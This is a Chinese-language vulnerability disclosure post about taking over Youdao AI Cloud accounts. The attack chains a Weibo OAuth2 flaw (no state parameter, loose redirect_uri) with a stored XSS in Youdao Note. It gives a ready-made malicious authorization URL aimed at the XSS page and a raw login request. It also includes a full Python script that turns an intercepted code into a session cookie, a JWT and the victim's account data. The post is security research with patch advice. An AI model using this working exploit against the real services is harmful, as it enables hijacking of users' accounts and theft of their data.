---
layout: post
title:  "高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)"
date:   2024-04-09 10:26:18 +0800
categories: account-takeover
---

## Name

> 有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)

## Weakness
> account takeover

## Severity
> High, 9.5

## URL
- POC网页: [https://api.weibo.com/oauth2/authorize?response_type=code&client_id=1230490736&redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&forcelogin=true###](https://api.weibo.com/oauth2/authorize?response_type=code&client_id=1230490736&redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&forcelogin=true###)

- 视频链接：[https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw](https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw) 提取码：1314

## Key Payload

OAuth2登录请求，其中code参数是攻击者截获的微博认证code：

```
GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
Host: ai.youdao.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://api.weibo.com/
Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
```

## Summary

网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：

1. 用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。
2. 当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。
3. 攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。

#### Trigger
1. 首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：[https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&gid=149090401&_time=1712630205225](https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&gid=149090401&_time=1712630205225)

    ![xiezuo](/assets/youdaoai/xiezuo.png)

    ![xiezuoxss](/assets/youdaoai/xiezuoxss.png)

2. 受害者：注册网易有道智云平台账号，[https://ai.youdao.com/login.s](https://ai.youdao.com/login.s)。并且进入账号设置，绑定微博账号。

    登录和注册：

    ![reg](/assets/youdaoai/register.png)

    微博绑定：

    ![weibo](/assets/youdaoai/weibo.png)

3. 攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。
    
    微博登录入口：

    ![weibod](/assets/youdaoai/weibodenglu.png)

    微博扫码登录界面：

    ![weiboa](/assets/youdaoai/weiboauth.png)

    分析微博验证界面的url链接：

    https://api.weibo.com/oauth2/authorize?response_type=code&client_id=1230490736&redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&forcelogin=true###

    可以看到OAuth2的返回token是`code`类型，`redirect_uri`指向`https://ai.youdao.com/login-weibo-redirect.s`，未提供`state`参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。
    
4. 笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。

    youdao.com域名下的xss漏洞链接：

    https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&gid=149090401&_time=1712630205225

    将上述链接urlencode后替换redirect_uri值：

    https://api.weibo.com/oauth2/authorize?response_type=code&client_id=1230490736&redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&forcelogin=true###

    打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：

    ![re](/assets/youdaoai/redirect.png)

    跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：

    ![xss](/assets/youdaoai/weibotoken.png)

    ![webhook](/assets/youdaoai/webhook2.png)

5. 攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:

    第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 `JSESSIONID_NEW` cookie作为session cookie。

    ![sess](/assets/youdaoai/sessioncookie.png)

    第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s

    ![login](/assets/youdaoai/loginweibo.png)

    第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。

    ![getjwt](/assets/youdaoai/getjwt.png)

    第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。

    ![getuser](/assets/youdaoai/getuserinfo.png)

6. 为自动化上述过程，笔者提供自动化脚本供测试：

    ```
    import requests
    import sys

    weiboCode= "weibo_code"
    # 1. login-weibo-redirect.s
    url = "https://ai.youdao.com/login-weibo-redirect.s?code="
    payload = {}
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
    }
    response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
    cookies = response.headers['Set-Cookie']

    JSESSIONID_NEW = None
    if cookies:
        cookie_strings = cookies.split(';')
        for cookie_string in cookie_strings:
            cookie_parts = cookie_string.strip().split('=')
            if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
                JSESSIONID_NEW = cookie_parts[1]
                print("Cookie Value:", JSESSIONID_NEW)
                break

    if not JSESSIONID_NEW:
        print("no JSESSIONID_NEW found")
        sys.exit()

    print("################get JSESSIONID_NEW###############")
    print(JSESSIONID_NEW)


    # 2. login-weibo.s 
    url = "https://ai.youdao.com/login-weibo.s"

    payload = {}
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
    'Origin': 'https://ai.youdao.com',
    'Sec-Fetch-Site': 'same-origin'
    }
    response = requests.request("POST", url, headers=headers, data=payload)

    # /consoleApi/ABTest/checkUser
    url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
    payload = {}
    response = requests.request("GET", url, headers=headers, data=payload)
    Authorization = response.headers['Authorization']
    print("################Authorization###############")
    print(Authorization)

    # /consoleApi/user/getUserInfo
    url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
    payload = {}
    response = requests.request("POST", url, headers=headers, data=payload)
    print("################getUserInfo###############")
    print(response.text)
    ```

### Proof
请提供截图或视频

链接：[https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw](https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw)
提取码：1314

## Impact

该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。

## Patch advice

1. 对微博OAuth2设置state参数，并且限定redirect url。

